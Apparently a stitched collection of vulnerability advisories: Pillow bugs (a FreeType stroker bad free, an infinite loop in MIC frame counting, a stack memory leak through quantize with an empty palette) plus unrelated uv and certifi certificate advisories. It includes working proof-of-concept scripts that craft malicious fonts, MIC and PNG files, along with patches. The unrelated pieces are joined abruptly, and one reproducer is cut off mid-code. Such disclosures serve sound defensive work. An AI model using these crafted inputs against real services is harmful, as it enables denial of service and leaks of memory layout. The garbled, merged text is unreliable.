### Summary
When text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.

### Details
`glyph` is declared without a NULL initializer:

- `src/_imagingft.c:848`

The first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:

- `src/_imagingft.c:1010-1013`

In the render loop the glyph is freed at the end of each iteration and not set back to NULL:

- `src/_imagingft.c:1242`

The cleanup frees it whenever a stroker exists:

- `src/_imagingft.c:1253-1256`

`ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.

### PoC
This needs `fontTools` and any base TTF (the example uses one bundled with Pillow's tests). It rewrites glyph "A" to claim 5000 contours in a glyph body far too short for them, so `FT_Load_Glyph` returns an error while the face still opens.

```python
import struct
from fontTools.ttLib import TTFont
from PIL import Image, ImageFont, ImageDraw

SRC = "Tests/fonts/FreeMono.ttf"          # any TTF works as a base
tt = TTFont(SRC)
gid = tt.getGlyphID(tt.getBestCmap()[ord("A")])
loca_long = tt["head"].indexToLocFormat
tt.close()

raw = bytearray(open(SRC, "rb").read())
nt = struct.unpack(">H", raw[4:6])[0]
tbl = {}
for i in range(nt):
    rec = 12 + i * 16
    tag = bytes(raw[rec:rec+4]).decode("latin-1")
    off, length = struct.unpack(">II", raw[rec+8:rec+16])
    tbl[tag] = (off, length)
glyf_off = tbl["glyf"][0]; loca_off = tbl["loca"][0]
if loca_long:
    o0 = struct.unpack_from(">I", raw, loca_off + 4*gid)[0]
else:
    o0 = struct.unpack_from(">H", raw, loca_off + 2*gid)[0] * 2
struct.pack_into(">h", raw, glyf_off + o0, 5000)   # numberOfContours = 5000
open("evil.ttf", "wb").write(raw)

f = ImageFont.truetype("evil.ttf", 20)             # face opens
d = ImageDraw.Draw(Image.new("RGB", (64, 64)))
d.text((0, 0), "A", font=f, stroke_width=2)        # load error -> FT_Done_Glyph on bad pointer
```

Result on the pinned build: `FT_Load_Glyph` returns an error and execution reaches the `glyph_error` cleanup that calls `FT_Done_Glyph(glyph)` (the plugin surfaces `OSError: invalid outline`).

### Impact
Applications that draw text with `stroke_width != 0` using fonts loaded from untrusted bytes can hit an invalid or double free. The correct fix is small: initialize `glyph = NULL` and set it back to NULL after each `FT_Done_Glyph`.

``` ============================================================================ Infinite loop in MIC n_frames when the embedded TIFF has 3+ IFDs Location: src/PIL/MicImagePlugin.py:86 in MicImageFile.tell() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 5.6 KB image file makes Pillow loop forever at 100% CPU when an application asks how many frames the image has. This only affects installations that have the optional `olefile` package. Any application that opens an untrusted image and then reads `im.n_frames` can have one worker tied up indefinitely. That includes the common "is this image animated?" check and re-saving with `save_all=True` to TIFF, PDF or WebP. The call never returns, raises no exception, and does not grow memory, so only an external watchdog stops it. The file is a Microsoft Image Composer (MIC) container, which Pillow recognises by its magic bytes with no extension needed. Inside it is a TIFF stream with three chained image directories. `MicImageFile` subclasses `TiffImageFile` and overrides `seek()` and `tell()` so that a "frame" means one stream in the container. It still inherits `TiffImageFile.n_frames` (`src/PIL/TiffImagePlugin.py:1212`), which walks the embedded TIFF's directory chain with `self._seek(self.tell() + 1)` until `_n_frames` is set. Two things stop that walk from making progress: - `MicImageFile.tell()` (`src/PIL/MicImagePlugin.py:86`) returns the constant stream index. - `MicImageFile.seek()` calls `TiffImageFile._open()`, which resets `_n_frames` to `None`. As a result, the loop re-parses the second directory forever whenever the embedded stream has three or more directories. `Image.open()`, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. The regression was introduced in 0b33a87b0d15 (April 2020, first released in 7.2.0), which removed `MicImageFile`'s own `n_frames` property. The attached reproducer builds the file in code and checks two controls, which return 3 and 1 frames as expected; the malicious file is still running when it is killed after 20 seconds. ## Details `MicImageFile` (registered for `Image.open` whenever `olefile` is installed) subclasses `TiffImageFile` and redefines a "frame" as one OLE `*.ACI/Image` stream, overriding `seek()` and `tell()` accordingly. It does not override the `n_frames` property, so the inherited TIFF implementation runs, and that implementation relies on `tell()` advancing as IFDs are loaded. `MicImageFile.tell()` returns the OLE stream index, which never changes inside `n_frames`, so the loop re-parses the same IFD forever. A 5632-byte OLE2 compound file whose `img0.ACI/Image` stream is a 351-byte TIFF with three chained 1×1 IFDs is enough. `Image.open()` on it succeeds (format `MIC`, detected by the OLE magic, no extension needed); evaluating `im.n_frames` then never returns and keeps one core at 100 %. A Python stack taken 27 s in is ``` File "src/PIL/TiffImagePlugin.py", line 1622 in _setup File "src/PIL/TiffImagePlugin.py", line 1271 in _seek File "src/PIL/TiffImagePlugin.py", line 1219 in n_frames ``` and instrumenting `_seek` shows it being called with `frame=1`, `tell()==0`, `_frame_pos==[8, 122]`, `_n_frames is None` on every iteration — identical state, so the loop is non-terminating, not merely slow. The same 351 TIFF bytes opened directly give `n_frames == 3` in milliseconds, and the same container around a 1-IFD TIFF gives `n_frames == 1`. The loop, `src/PIL/TiffImagePlugin.py:1212`: ```python @property def n_frames(self) -> int: current_n_frames = self._n_frames if current_n_frames is None: current = self.tell() self._seek(len(self._frame_pos)) while self._n_frames is None: self._seek(self.tell() + 1) # 1219 self.seek(current) ``` and the overrides that break its progress assumption, `src/PIL/MicImagePlugin.py:76`: ```python def seek(self, frame: int) -> None: … self.fp = self.ole.openstream(filename) TiffImagePlugin.TiffImageFile._open(self) # 82: resets _n_frames to None self.frame = frame def tell(self) -> int: return self.frame # 87: OLE stream index, not TIFF __frame ``` For a plain TIFF, `_seek(k)` (`TiffImagePlugin.py:1236`) loads IFDs up to `k`, appending each offset to `_frame_pos`, setting `_n_frames` when an IFD's next-pointer is 0 (or already seen), and setting the private `__frame = k`; `TiffImageFile.tell()` returns `__frame`, so `self.tell() + 1` walks the chain to its end. For a MIC file, `Image.open` → `MicImageFile._open` sets `self._n_frames = len(self.images)` at line 69, but then calls `self.seek(0)` → `TiffImageFile._open` (line 82), which unconditionally sets `self._n_frames = None` (`TiffImagePlugin.py:1203`) and `_seek(0)`s into the embedded stream. With the 3-IFD stream, IFD 0 has a non-zero next pointer, so `_n_frames` stays `None` after open. `n_frames` then runs: `current = self.tell()` is `0` (the OLE index); `_seek(len(_frame_pos))` = `_seek(1)` loads IFD 1, whose next pointer is also non-zero and not yet in `_frame_pos`, so `_n_frames` is still `None`. The `while` body computes `self.tell() + 1` = `0 + 1` and calls `_seek(1)` again; `len(_frame_pos)` is already 2, so nothing new is loaded — IFD 1 is re-read via `tag_v2.load` and `_setup()` and the state is unchanged. This repeats indefinitely; IFD 2 is never reached. Two chained IFDs are not enough (IFD 1's next pointer of 0 sets `_n_frames = 2` on the first `_seek(1)`); three or more are. `Tests/test_file_mic.py::test_n_frames` passes only because `hopper.mic`'s stream has a single IFD, so `_seek(0)` sets `_n_frames = 1` and the loop is never entered; the `len(self.images)` assignment at line 69 is only consumed by the initial `_seek_check(0)` and is overwritten before any caller can read `n_frames`. A side effect of the same mismatch: with a 2-IFD stream `n_frames` returns 2 (TIFF IFDs) while `seek(1)` indexes `self.images[1]` (OLE streams) and raises `IndexError` — visible with `save_all=True`. ## Impact Any application that lets Pillow open an uploaded file and then reads `im.n_frames` — the usual way to decide whether an image is animated (`getattr(im, "n_frames", 1) > 1`), and also what `hasattr(im, "n_frames")`/`getattr(im, "n_frames", 1)` in Pillow's own `TiffImagePlugin._save_all` (`:2333`), `PdfImagePlugin._save` (`:250`) and `WebPImagePlugin._save_all` (`:171`) evaluate when the app re-saves with `save_all=True` — can be made to spin one worker at 100 % CPU indefinitely with a 5.6 KB upload. The file needs no particular extension (OLE magic; `FpxImagePlugin` rejects it on CLSID and `MicImagePlugin` accepts it), default limits do not intervene, memory does not grow, and no exception is raised, so only an external watchdog ends it. Preconditions: `olefile` installed (it is an optional dependency; without it the MIC plugin is not registered) and the application touching `n_frames` or a `save_all` path. `Image.open()` itself, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. This is the same class of tiny-file, pure-Python non-termination as CVE-2021-28676 (FLI) and CVE-2021-28677 (EPS), and like CVE-2019-19911 (FPX) it depends on `olefile`; it differs in not being reached by the default open/load path. The regression was introduced in `0b33a87b0d15` ("Replaced property methods for n_frames and is_animated with normal properties", 2020-04-13), first released in 7.2.0, which replaced `MicImageFile`'s own `n_frames` property with the `_n_frames` attribute that `TiffImageFile._open` overwrites. ## Reproducing `repro` is a single Python script that runs against the installed Pillow (with `olefile`, which is what registers the MIC plugin). It builds every input in code, writes each one to a temporary file named `x` with no extension (so Pillow identifies the format from its magic bytes), and opens it in a child Python process that runs `Image.open(path)` and prints `im.format` and `im.n_frames`. It builds two things in code: - `tiff(n)`: an `n`-page TIFF of 4×4 greyscale frames written by Pillow itself (`save_all=True`), so the IFDs are chained exactly as Pillow's own writer chains them. The last next-IFD pointer is 0. - `mic(stream)`: a minimal OLE2 compound file with a storage named `img0.ACI` that contains a stream named `Image`, which is the layout `MicImageFile._open` looks for. Sector 0 is the FAT and sector 1 is the directory. The stream starts at sector 2 and is padded to 4096 bytes, so the file doesn't need a mini-FAT. The result is 5632 bytes. It runs three inputs, each in its own child process with a hard 20-second kill: 1. control: the plain 3-page TIFF. Expected `TIFF n_frames = 3`. 2. control: a MIC wrapping a 1-page TIFF. Expected `MIC n_frames = 1`. 3. attack: the same MIC container wrapping the 3-page TIFF. The timeout is enforced by killing the child rather than by an in-process alarm, because a `TimeoutError` raised while `ImageFileDirectory_v2.load()` is parsing would be caught by its `except OSError` (`TiffImagePlugin.py:958`) and leave the IFD half-parsed instead of stopping the loop. The script prints `BUG` when both controls return and the attack child is still running after 20 seconds; otherwise it prints `OK`. With the attached patch applied, the attack case prints `MIC n_frames = 1` and the script prints `OK`. ## Suggested fix The attached patch restores the OLE-level frame count after the embedded TIFF stream has been opened, so the inherited `n_frames` never enters its IFD-walking loop and `n_frames`/`seek()` agree on what a frame is. In `MicImageFile.seek`, `src/PIL/MicImagePlugin.py:82`, right after `TiffImagePlugin.TiffImageFile._open(self)`: ```diff TiffImagePlugin.TiffImageFile._open(self) + # TiffImageFile._open() resets the frame count to that of the + # embedded TIFF stream, but the frames of an MIC file are its streams + self._n_frames = len(self.images) + self.is_animated = self._n_frames > 1 + self.frame = frame ``` Doing this in `seek()` restores the invariant on every seek, not only the first. The existing assignments at lines 69–70 of `_open` are kept: the initial `seek(0)` → `_seek_check(0)` reads `n_frames` before `TiffImageFile._open` has run, so they are still needed. Plain read-only `n_frames`/`is_animated` properties, as before 0b33a87b0, are no longer a drop-in option because `TiffImageFile._seek` assigns `self.is_animated`. With the patch applied to a clean tree and rebuilt, the attack file returns `n_frames == 1` immediately, a 2-IFD stream raises `EOFError` on `seek(1)` instead of `IndexError`, `save_all=True` to TIFF and PDF completes, and `Tests/test_file_mic.py` and `Tests/test_file_tiff.py` pass. No regression test is included, since one would need a new binary MIC fixture in `Tests/images`. The patch passed that check but has not been reviewed beyond it as the final form of the fix. Two things it leaves alone: it does not add the `_im` reset that `TiffImageFile.seek` performs after `_seek` (`TiffImagePlugin.py:1229`), which matters when switching between OLE streams of different size or mode; and `TiffImageFile.n_frames` still advances via the overridable `tell()` rather than its private `__frame`, so making it iterate on `__frame` would protect any other subclass that redefines `tell()`. ## The patch Restore the OLE stream frame count in MicImageFile.seek() after TiffImageFile._open() resets it, so n_frames cannot loop forever Applies to `src/PIL/MicImagePlugin.py` at the commit above. It passed the mechanical check — applied to a clean tree, rebuilt, the reproducer stopped firing — but a reviewer did not endorse it as the right fix. ```diff diff --git a/src/PIL/MicImagePlugin.py b/src/PIL/MicImagePlugin.py index f8cf3a76f..2bb0109ce 100644 --- a/src/PIL/MicImagePlugin.py +++ b/src/PIL/MicImagePlugin.py @@ -81,6 +81,11 @@ class MicImageFile(TiffImagePlugin.TiffImageFile): TiffImagePlugin.TiffImageFile._open(self) + # TiffImageFile._open() resets the frame count to that of the + # embedded TIFF stream, but the frames of an MIC file are its streams + self._n_frames = len(self.images) + self.is_animated = self._n_frames > 1 + self.frame = frame def tell(self) -> int: ``` ## The reproducer
Reproducer — repro, 2,330 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # MicImageFile inherits TiffImageFile.n_frames, whose loop `self._seek(self.tell()+1)` # relies on tell() advancing; MicImageFile.tell() returns the OLE stream index (constant), # so a MIC file whose Image stream is a TIFF with >=3 chained IFDs makes im.n_frames spin forever. import io, struct, subprocess, sys, tempfile, os from PIL import Image def tiff(n): # n-page TIFF written by Pillow itself b = io.BytesIO(); fr = [Image.new("L", (4, 4), i) for i in range(n)] fr[0].save(b, "TIFF", save_all=True, append_images=fr[1:]); return b.getvalue() def mic(stream): # minimal OLE2 file: storage "img0.ACI" containing stream "Image" END, FREE, FATSECT = 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD data = stream.ljust(4096, b"\0"); n = len(data) // 512 fat = [FATSECT, END] + [3 + k for k in range(n - 1)] + [END]; fat += [FREE] * (128 - len(fat)) def entry(name, kind, child, start, size): raw = name.encode("utf-16-le") + b"\0\0" return raw.ljust(64, b"\0") + struct.pack(" {out}"); return hung c1 = run("control: 3-page TIFF, direct", tiff(3)) c2 = run("control: MIC around 1-page TIFF", mic(tiff(1))) bug = run("attack: MIC around 3-page TIFF", mic(tiff(3))) print("BUG" if bug and not c1 and not c2 else "OK") ```

items.summary:
By default, uv verifies TLS connections against a vendored copy of the `webpki-root-certs` bundle. Versions before 0.13.4 include the `emSign ECC Root CA - G3` root. Eight eMudhra intermediate CA certificates that chain to that root have compromised private keys, and the CA has revoked them.

An attacker with one of the compromised keys can issue certificates that uv accepts for any hostname, and can be used to issue certificates to enable MITM attacks.

uv 0.13.4 removes the root from its vendored bundle, following `webpki-root-certs` 1.0.10. Upgrade to 0.13.4 or later.

Certifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them. 

An attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.

Certifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi.

``` ============================================================================ Image.quantize() with empty palette leaks uninitialized stack memory Location: src/libImaging/Palette.c:216 in ImagingPaletteCacheUpdate() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` When an application lets a user supply the palette image for Pillow's `Image.quantize(palette=...)`, the user can get back 512 bytes of the server process's stack memory in the pixels of the returned image. An 80-byte PNG with an empty palette is enough, and the leaked bytes survive saving to PNG or GIF. In the runs examined, those bytes included memory addresses inside the stack, heap, libc, libpython and Pillow's own C module, along with the stack-protector canary. The bug is in `ImagingPaletteCacheUpdate()` in `src/libImaging/Palette.c`. It fills a local `UINT8 c[512]` only inside loops bounded by `palette->size`. When the palette has zero entries, the array is never written, but it is still copied into the colour cache. `topalette()` in `src/libImaging/Convert.c` then emits the cached values as output pixel indices. `topalette()` rejects a `NULL` palette but not one with `size == 0`. Three inputs produce such a zero-entry `"P"` image: a PNG with a zero-length `PLTE` chunk opened with `Image.open()`, a colour-mapped TGA with colour-map length 0, or a bare `Image.new("P", ...)`. The attacker must control the *palette* image; the source image can be anything, and `RGB` sources are affected with either dither mode. There is no out-of-bounds access and no memory corruption. The consequence is a bounded stack disclosure that can reveal address layout and the canary of a long-lived worker, with no crash and no log entry. The attached reproducer quantizes a 512-colour strip against the empty-palette PNG and finds 8 of the 64 output words pointing into the process's own `[stack]` mapping, while a one-entry palette control yields all zeros. The behaviour was introduced in commit `54cb09d8b48c` (first released in 9.1.0). The `Image.new("P", ...)` route exists since 10.1.0. ## Details `ImagingPaletteCacheUpdate()` (`src/libImaging/Palette.c:154`) computes, for one 8×8×8 box of the colour cache, the nearest palette index for each of the 512 slots into a local `UINT8 c[512]` and then copies `c[]` into the cache. `c[]` is only ever written inside `for (i = 0; i < palette->size; i++)`. When the palette has zero entries nothing writes it, the untouched stack bytes are copied into the cache, and `topalette()` (`src/libImaging/Convert.c:1145`) emits them as the output pixels of `Image.quantize(palette=...)`. The root cause is that `topalette()` only rejects a `NULL` palette, never one with `palette->size == 0`, while `ImagingPaletteCacheUpdate()` silently assumes `size >= 1`. A zero-entry `"P"` image is what `Image.open()` produces for a PNG whose `PLTE` chunk has length 0 (or a colour-mapped TGA with colour-map length 0); `Image.new("P", size)` without a subsequent `putpalette()` yields one as well. Both dither modes (`Dither.NONE` and the default Floyd-Steinberg) are affected for `RGB` sources (an `L` source takes the grayscale copy path and never consults the cache). Showing it with the installed build, no special flags. The 80-byte PNG below is 4×4, bit depth 8, colour type 3, with a zero-length `PLTE` and an all-zero `IDAT`: ``` 89504e470d0a1a0a 0000000d49484452 0000000400000004 0803000000 9e2f6e4c 00000000 504c5445 4ba88955 0000000b 49444154 789c6360c0040000140001 7dfe1eee 00000000 49454e44 ae426082 ``` ```python pal = Image.open(io.BytesIO(png)); pal.load() # pal.mode == "P", pal.im.getpalette("RGB") == b"" src = Image.new("RGB", (512, 1)) src.putdata([(r*4, g*4, b*4) for r in range(8) for g in range(8) for b in range(8)]) out = src.quantize(palette=pal, dither=Image.Dither.NONE) out.tobytes() # 512 bytes, different in every process ``` The 512 source colours are chosen so that each pixel lands in a distinct slot of the cache box for `r,g,b ∈ [0,32)`, in slot order, so `out.tobytes()` is exactly `c[0..511]`. Read as 64 little-endian 8-byte words and resolved against the same process's `/proc/self/maps`, a typical run gives 43 words that are addresses inside the process's own mappings — 8 in `[stack]`, several in `[heap]`, `libc.so.6`, `libpython3.12.so` and `_imaging.cpython-312-x86_64-linux-gnu.so` — and 3 words equal to the thread's stack-protector canary (read from `fs:0x28` for comparison). The same PNG with a 3-byte `PLTE` (one entry) gives 512 zero bytes in every run. `out.save(buf, "PNG")` succeeds, so the bytes leave the process in an ordinary image. Under valgrind (run against a `strip --strip-debug` copy of `_imaging.so` or a gcc build, since valgrind 3.19 cannot read clang's DWARF5) the report carries the origin `Uninitialised value was created by a stack allocation at ImagingPaletteCacheUpdate`. With `Dither.NONE` `topalette` only copies the bytes, so the first `use of uninitialised value` is flagged where Python first branches on the pixel data; with the default Floyd-Steinberg dither it is flagged inside `topalette` (inlined into `ImagingConvert`), where the cached index is used to address `palette->palette`. ### Code path File → empty C palette. `PngImagePlugin.chunk_PLTE` (`src/PIL/PngImagePlugin.py:499-505`) stores the chunk payload whatever its length, `_open` wraps it as `ImagePalette.raw("RGB", b"")` (`:836-838`), and `Image.load()` realises it with `self.im.putpalette("RGB", "RGB", b"")` (`src/PIL/Image.py:989-990`). `_putpalette` (`src/_imaging.c:1850-1868`) rejects only more than 256 entries and sets `palette->size = palettesize * 8 / bits`, i.e. 0. `TgaImagePlugin._open` (`src/PIL/TgaImagePlugin.py:121-135`) builds the same empty palette from a colour-mapped TGA whose colour-map-length field is 0. API → sink. `Image.quantize(palette=pal)` (`src/PIL/Image.py:1329-1338`) checks only `palette.mode == "P"` and calls `self.im.convert("P", dither, palette.im)` → `ImagingConvert` → `topalette(..., inpalette=, dither)`. `topalette` tests the palette for `NULL` (`Convert.c:1162`, `:1178`) but not for `size == 0`, allocates the cache (every slot `0x100` = "not computed"), and for each source pixel: ```c // src/libImaging/Convert.c:1319-1327 (non-dither path; the dither path at 1252-1265 is the same) cache = &ImagingPaletteCache(palette, r, g, b); if (cache[0] == 0x100) { ImagingPaletteCacheUpdate(palette, r, g, b); } … out[x] = (UINT8)cache[0]; ``` Inside `ImagingPaletteCacheUpdate` the only store to `c[]` is in step 2, and both step 1 and step 2 iterate over palette entries: ```c // src/libImaging/Palette.c:160-161 unsigned int d[BOXVOLUME]; UINT8 c[BOXVOLUME]; … // src/libImaging/Palette.c:212-221, 240-242 for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; /* d[] is initialised, c[] is not */ } for (i = 0; i < palette->size; i++) { /* size == 0: body never runs */ if (dmin[i] <= dmax) { … if ((unsigned int)bd < d[j]) { d[j] = bd; c[j] = (UINT8)i; } ``` For any non-empty palette every slot is written: the entry that produced `dmax` passes `dmin[i] <= dmax`, and because `d[j]` starts at `~0` the first visiting entry always stores into `c[j]`. With `size == 0` the loop is skipped entirely and step 3 publishes the raw stack array: ```c // src/libImaging/Palette.c:262-266 j = 0; for (r = r0; r < r1; r += 4) { for (g = g0; g < g1; g += 4) { for (b = b0; b < b1; b += 4) { ImagingPaletteCache(palette, r, g, b) = c[j++]; ``` `cache[0]` is then ≤ 255 and `palette->palette` is a fixed 1024-byte array, so the subsequent `palette->palette[cache[0] * 4]` reads in the dither path stay in bounds; the defect is purely that stack contents become pixel values. Because no deeper call happens between successive `ImagingPaletteCacheUpdate` invocations in the pixel loop, every box yields the same 512 bytes — whatever earlier, deeper call chains (the PNG decode, the interpreter) left at that stack depth. The behaviour was introduced in `54cb09d8b48c` ("When converting to P, restrict colors to palette size", 2022-02-16), first released in 9.1.0; before it, the cache update iterated over all 256 palette slots. The `Image.new("P", ...)` route additionally depends on `fd310512b95a` ("Set C palette to be empty by default", first in 10.1.0); before that a fresh `"P"` image carried a 256-entry grey ramp. ## Impact An application that lets a user supply the reference palette image for `Image.quantize(palette=...)` — palette-swap / "apply this palette" features, sprite and GIF tooling, pixel-art converters — and returns the quantised result hands that user 512 bytes of the worker's C stack, encoded as pixel indices (directly readable from the saved PNG/GIF, since index values survive losslessly). In the build examined those bytes contain return addresses and frame pointers into the stack, heap, libc, libpython and `_imaging.so`, plus the stack-protector canary: an ASLR and canary disclosure from a long-lived server process, obtained with an 80-byte upload, no crash and no log entry. The precondition is that the attacker controls the *palette* image (the source image can be anything with at least one colour per cache box of interest); when the palette image is application-owned the path is not reachable. There is no out-of-bounds access and no memory corruption. ## Reproducing `repro` is a short, single-file Python script that runs against the installed Pillow. It doesn't rebuild anything or start any other process, and it finishes in about 0.1 s. 1. `png_with_plte()` builds a 4×4 palette-mode PNG (bit depth 8, colour type 3) around a given `PLTE` payload. With an empty payload it produces exactly the 80-byte file shown above. 2. `quantize_against()` does what an "apply this palette" feature does: it opens the PNG with `Image.open()` and calls `quantize(palette=pal, dither=Image.Dither.NONE)` on a 512×1 RGB strip. The strip holds the colours `(r*4, g*4, b*4)` for `r, g, b` in `0..7`, one for each slot of the colour-cache box `r, g, b ∈ [0,32)` and in slot order. That makes output pixel `j` exactly `c[j]` of `ImagingPaletteCacheUpdate()`. 3. **Control:** a one-entry `PLTE`. The only valid index is 0, and every output pixel is 0. 4. **Attack:** the same PNG with a zero-length `PLTE`. `quantize()` returns an image without complaint, and its pixels contain about 80 distinct values. 5. **Check:** the script reads the 512 output bytes as 64 little-endian 8-byte words and compares them with the `[stack]` range in the script's own `/proc/self/maps`. It prints each word that points into the stack. A typical run finds 8, e.g. `pixels 0..7 = 0x00007ffd959c3fa0 <- pointer into [stack]`. Pixel data can only hold stack addresses if it was copied from the stack. The script prints `BUG` if the control is all zeros and at least two output words are stack addresses. It prints `OK` if `quantize()` rejects the empty palette with `ValueError`, which is what the attached patch does, or if the output has no stack pointers. The script was also checked against an out-of-tree rebuild, which is not part of the script. With the attached patch it prints `attack (empty PLTE): rejected: empty palette` / `OK`. With only the `Palette.c` half of the patch, the output is 512 zero bytes and it prints `OK`. ## Suggested fix The attached patch rejects an empty palette in `topalette()` before any work is done, with `ValueError("empty palette")` in the same idiom as the neighbouring "no palette" / "conversion not supported" checks, so `Image.quantize()` raises a normal `ValueError`. It also zero-fills `c[]` alongside `d[]` in `ImagingPaletteCacheUpdate()` so no present or future caller can copy stack contents into the cache, and adds a regression test `test_empty_palette` to `Tests/test_image_quantize.py`. `quantize(palette=)` is the only path that hands a caller-supplied palette to `topalette()`; the `NULL`-palette branches always build 256- or 226-entry palettes and are unaffected. The one behaviour change is that quantizing against an empty palette (including a bare `Image.new("P", ...)`) now raises instead of returning garbage indices. The C changes: ```diff --- a/src/libImaging/Convert.c +++ b/src/libImaging/Convert.c @@ -1159,6 +1159,10 @@ topalette( alpha = mode == IMAGING_MODE_PA; + if (palette != NULL && palette->size <= 0) { + return (Imaging)ImagingError_ValueError("empty palette"); + } + if (palette == NULL) { /* FIXME: make user configurable */ if (imIn->bands == 1) { --- a/src/libImaging/Palette.c +++ b/src/libImaging/Palette.c @@ -211,6 +211,7 @@ ImagingPaletteCacheUpdate(ImagingPalette palette, int r, int g, int b) { for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; + c[i] = 0; } for (i = 0; i < palette->size; i++) { ``` Applied to a clean copy of the tree and rebuilt, the reproducer's attack step fails with `ValueError: empty palette` and the script prints `OK`; the one-entry control is unchanged. Apart from the regression test, the patch does not touch the Python code in `src/PIL`. Optionally `PngImagePlugin.chunk_PLTE` could additionally raise `SyntaxError` for a `PLTE` whose length is 0 or not a multiple of 3, as the PNG specification requires 1–256 entries, and `Image.quantize()` could raise a clearer Python-level error when `palette.palette` is empty. ## The patch Raise ValueError in topalette() for a palette with no entries and zero-initialise the cache slot array in ImagingPaletteCacheUpdate() Applies to `src/libImaging/Convert.c` at the commit above. ```diff diff --git a/Tests/test_image_quantize.py b/Tests/test_image_quantize.py index 887628560..dcd1d901e 100644 --- a/Tests/test_image_quantize.py +++ b/Tests/test_image_quantize.py @@ -179,3 +179,13 @@ def test_small_palette() -> None: quantized_colors = im.getcolors() assert quantized_colors is not None assert len(quantized_colors) == 2 + + +def test_empty_palette() -> None: + im = hopper() + + p = Image.new("P", (1, 1)) + p.putpalette(b"") + + with pytest.raises(ValueError): + im.quantize(palette=p) diff --git a/src/libImaging/Convert.c b/src/libImaging/Convert.c index 4a35a9a1f..7746d9255 100644 --- a/src/libImaging/Convert.c +++ b/src/libImaging/Convert.c @@ -1159,6 +1159,10 @@ topalette( alpha = mode == IMAGING_MODE_PA; + if (palette != NULL && palette->size <= 0) { + return (Imaging)ImagingError_ValueError("empty palette"); + } + if (palette == NULL) { /* FIXME: make user configurable */ if (imIn->bands == 1) { diff --git a/src/libImaging/Palette.c b/src/libImaging/Palette.c index b2dacf656..ceb69d3dc 100644 --- a/src/libImaging/Palette.c +++ b/src/libImaging/Palette.c @@ -211,6 +211,7 @@ ImagingPaletteCacheUpdate(ImagingPalette palette, int r, int g, int b) { for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; + c[i] = 0; } for (i = 0; i < palette->size; i++) { ``` ## The reproducer
Reproducer — repro, 2,975 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # Pillow: Image.quantize(palette=

) returns # uninitialised C stack bytes as pixel values. # # ImagingPaletteCacheUpdate() (src/libImaging/Palette.c) only writes its local # UINT8 c[512] inside `for (i = 0; i < palette->size; i++)`. A PNG with a # zero-length PLTE chunk gives palette->size == 0, so c[] is never written and # its raw stack contents are copied into the colour cache, which topalette() # (src/libImaging/Convert.c) then emits as the output pixels. import io import struct import zlib from PIL import Image def png_with_plte(plte): """A 4x4 palette-mode (colour type 3) PNG whose PLTE chunk holds `plte`.""" def chunk(tag, data): return (struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data))) ihdr = struct.pack(">IIBBBBB", 4, 4, 8, 3, 0, 0, 0) pixels = zlib.compress(b"\x00" * 4 * 5) return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"PLTE", plte) + chunk(b"IDAT", pixels) + chunk(b"IEND", b"")) def quantize_against(palette_png): """What an "apply this palette" feature does with an uploaded palette image.""" pal = Image.open(io.BytesIO(palette_png)) # 512 colours, one per slot of the colour-cache box r,g,b in [0,32), in slot # order: output pixel j is exactly c[j] of ImagingPaletteCacheUpdate(). src = Image.new("RGB", (512, 1)) src.putdata([(r * 4, g * 4, b * 4) for r in range(8) for g in range(8) for b in range(8)]) return src.quantize(palette=pal, dither=Image.Dither.NONE).tobytes() def stack_range(): for line in open("/proc/self/maps"): if line.rstrip().endswith("[stack]"): lo, hi = line.split()[0].split("-") return int(lo, 16), int(hi, 16) # Control: a one-entry palette -- every pixel must map to index 0. control = quantize_against(png_with_plte(b"\x10\x20\x30")) print(f"control (1-entry PLTE): distinct pixel values = {sorted(set(control))}") # Attack: the same PNG with an empty PLTE chunk (80 bytes). try: leaked = quantize_against(png_with_plte(b"")) except ValueError as e: print(f"attack (empty PLTE): rejected: {e}") print("OK") raise SystemExit print(f"attack (empty PLTE): {len(set(leaked))} distinct pixel values; first 64 bytes:") print(f" {leaked[:64].hex()}") # Read the 512 pixel bytes as 64 little-endian words; any word that is an # address inside this process's own stack can only have come from the stack. lo, hi = stack_range() print(f"this process's [stack] mapping: {lo:#x}-{hi:#x}") stack_ptrs = 0 for i in range(0, 512, 8): word = int.from_bytes(leaked[i:i + 8], "little") if lo <= word < hi: stack_ptrs += 1 print(f" pixels {i:3d}..{i + 7:3d} = {word:#018x} <- pointer into [stack]") print(f"{stack_ptrs} of 64 words of the output image are stack addresses") print("BUG" if set(control) == {0} and stack_ptrs >= 2 else "OK") ```

